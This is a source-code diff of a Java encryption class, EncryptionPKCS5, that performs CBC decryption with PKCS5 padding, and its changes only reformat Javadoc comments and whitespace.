@@ -19,11 +19,12 @@ import com.ht.RCSAndroidGUI.utils.Utils;
  * The Class EncryptionPKCS5.
  */
 public class EncryptionPKCS5 extends Encryption {
-	
+
 	/**
 	 * Instantiates a new encryption pkc s5.
-	 *
-	 * @param key the key
+	 * 
+	 * @param key
+	 *            the key
 	 */
 	public EncryptionPKCS5(final byte[] key) {
 		super(key);
@@ -67,7 +68,9 @@ public class EncryptionPKCS5 extends Encryption {
 		return newlen;
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.crypto.Encryption#pad(byte[], int, int)
 	 */
 	@Override
@@ -75,7 +78,9 @@ public class EncryptionPKCS5 extends Encryption {
 		return pad(plain, offset, len, true);
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.RCSAndroidGUI.crypto.Encryption#decryptData(byte[], int, int)
 	 */
 	@Override
@@ -107,7 +112,7 @@ public class EncryptionPKCS5 extends Encryption {
 			crypto.decrypt(ct, pt);
 			xor(pt, iv);
 			iv = Utils.copy(ct);
-			System.arraycopy( pt, 0,paddedplain, i * 16, 16);
+			System.arraycopy(pt, 0, paddedplain, i * 16, 16);
 		}
 
 		final int padlen = paddedplain[paddedplain.length - 1];
@@ -122,7 +127,7 @@ public class EncryptionPKCS5 extends Encryption {
 		plainlen = enclen - padlen;
 		plain = new byte[plainlen];
 
-		System.arraycopy( paddedplain, 0,plain, 0, plainlen);
+		System.arraycopy(paddedplain, 0, plain, 0, plainlen);
 
 		// #ifdef DBC
 		Check.ensures(plain != null, "null plain");
@@ -133,8 +138,9 @@ public class EncryptionPKCS5 extends Encryption {
 
 	/**
 	 * Encrypt data integrity.
-	 *
-	 * @param plain the plain
+	 * 
+	 * @param plain
+	 *            the plain
 	 * @return the byte[]
 	 */
 	public byte[] encryptDataIntegrity(final byte[] plain) {
@@ -158,10 +164,12 @@ public class EncryptionPKCS5 extends Encryption {
 
 	/**
 	 * Decrypt data integrity.
-	 *
-	 * @param cyphered the cyphered
+	 * 
+	 * @param cyphered
+	 *            the cyphered
 	 * @return the byte[]
-	 * @throws CryptoException the crypto exception
+	 * @throws CryptoException
+	 *             the crypto exception
 	 */
 	public byte[] decryptDataIntegrity(final byte[] cyphered)
 			throws CryptoException {
